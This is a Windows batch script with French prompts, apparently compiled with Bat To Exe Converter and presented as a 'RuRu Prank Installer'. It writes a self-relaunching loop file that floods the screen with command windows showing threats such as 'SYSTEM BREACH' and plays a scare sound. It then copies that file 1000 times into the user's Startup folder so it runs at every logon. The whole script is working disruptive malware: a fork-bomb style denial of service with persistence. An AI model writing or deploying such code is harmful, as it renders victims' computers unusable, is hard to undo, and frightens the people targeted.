::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcAeKLmKpOpET/+b34OuDsXEOV+MtfcHM26Lu
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBhcXg2RAE+1EbsQ5+n//NakqkwJc9ILOKbW27OLYMoG5AW1J9pthCoIzYdMXENnK0GUPVl0mUMMv2eKVw==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
chcp 65001 >nul
break off
title RuRu Prank Installer
setlocal EnableDelayedExpansion

:: Chemins
set "payloadFile=%APPDATA%\chaos.bat"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "wavFile=scare.wav"
set "targetWav=%~dp0scare.wav"

:: Vérifie si le .wav est présent et copie
if exist "%~dp0%wavFile%" (
    copy "%~dp0%wavFile%" "%targetWav%" >nul
) else (
    echo [ERREUR] Le fichier scare.wav est introuvable dans le dossier du script.
    pause
    exit /b
)

:: Menu de sélection d'OS
:OSMenu
cls
echo	██████╗ ██╗   ██╗██████╗ ██╗   ██╗    ██████╗ ██████╗  █████╗ ███╗   ██╗██╗  ██╗
echo	██╔══██╗██║   ██║██╔══██╗██║   ██║    ██╔══██╗██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
echo	██████╔╝██║   ██║██████╔╝██║   ██║    ██████╔╝██████╔╝███████║██╔██╗ ██║█████╔╝ 
echo	██╔══██╗██║   ██║██╔══██╗██║   ██║    ██╔═══╝ ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
echo	██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚████║██║  ██╗
echo	╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
echo					PS: NTM MENDES
echo 		=============================================
echo         			RuRu Prank Installer                
echo 		=============================================
echo.
echo 				Versions de Windows ?
echo					[1] Windows 7
echo					[2] Windows 10 ou 11
echo.

set /p oschoice=Choix (1/2) : 

if "%oschoice%"=="1" goto W7Main
if "%oschoice%"=="2" goto W10Main

echo Choix invalide.
pause
goto OSMenu

::=============================:
:W7Main
cls
echo [Windows 7] - Installation...
goto PayloadInstall

:W10Main
cls
echo [Windows 10/11] - Installation...
goto PayloadInstall

::=============================:
:PayloadInstall
:: Génère le chaos.bat
echo @echo off>"%payloadFile%"
echo title ☠ SYSTEM FAILURE ☠>>"%payloadFile%"
echo mode con: cols=30 lines=5>>"%payloadFile%"
echo color 4f>>"%payloadFile%"
echo :loop>>"%payloadFile%"
echo start cmd /c chaos.bat>>"%payloadFile%"
echo start cmd /k color 4f ^& echo ☠ CHAOS ☠>>"%payloadFile%"
echo start cmd /k color cf ^& echo 👁 SYSTEM BREACH 👁>>"%payloadFile%"
echo start cmd /k color 0c ^& echo 💀 NO ESCAPE 💀>>"%payloadFile%"
echo start /min powershell -c (New-Object Media.SoundPlayer '%targetWav%').Play();>>"%payloadFile%"
echo goto loop>>"%payloadFile%"

:: Copie 1000 fois le payload avec des noms différents
for /L %%i in (1,1,1000) do (
    set "filename=launch_hell%%i.bat"
    call copy "%payloadFile%" "%startupFolder%\!filename!" >nul
)

echo.
echo ✅ Installation terminee. Redemarre le PC si t'as des couilles.
pause
exit
